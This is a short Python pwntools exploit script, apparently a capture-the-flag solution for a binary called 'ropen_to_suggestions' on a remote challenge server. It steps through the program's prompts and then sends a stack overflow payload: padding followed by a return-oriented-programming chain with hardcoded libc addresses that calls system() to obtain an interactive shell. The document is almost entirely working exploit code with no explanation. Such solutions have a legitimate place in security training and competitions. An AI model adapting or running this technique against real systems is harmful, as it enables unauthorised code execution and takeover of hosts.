from pwn import *
sh = remote('challenge.acictf.com', 31803)
#sh = process('./ropen_to_suggestions')
puts = p64(0x0000000000400820)
#'\x90\x86\x87\xf7\xff\x7f'
#fgets = p64(0x0000000000602020)
base = 0x7ffff7809000
system_offset=0x45390
system = base+system_offset
print(system)
shell = system+0x1479c7
sh.recvuntil("FALKEN.\n")
sh.sendline("Greetings")
sh.recvuntil("TODAY?\n")
sh.sendline("Good")
sh.recvuntil("3.\n")
sh.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
sh.recvuntil("WAR\n")
sh.sendline("3")
sh.recvuntil("Menu\n")
sh.sendline("4")
sh.recvuntil("Saber")
payload = "S"*120
payload += p64(0x0000000000400dd3)
payload += p64(0x00007ffff7995d57)
payload += p64(0x00007ffff784e390)
payload += p64(0x00007ffff7843030)
payload += p64(0x00007ffff7995d57)
#payload += fgets
#payload += puts
#payload += p64(0x00007ffff7a52390)
#payload += "aaaaaaaa"
#payload += p64(0x00007ffff7b99d57)
sh.sendline(payload)
#x= sh.recvuntil("through.\n")
#y = sh.recvline()
#print "x: "+x
#print "y: "+y
#y = y.strip()
#y = int(y, 16)
#print y
#print(p64(x))
sh.interactive()
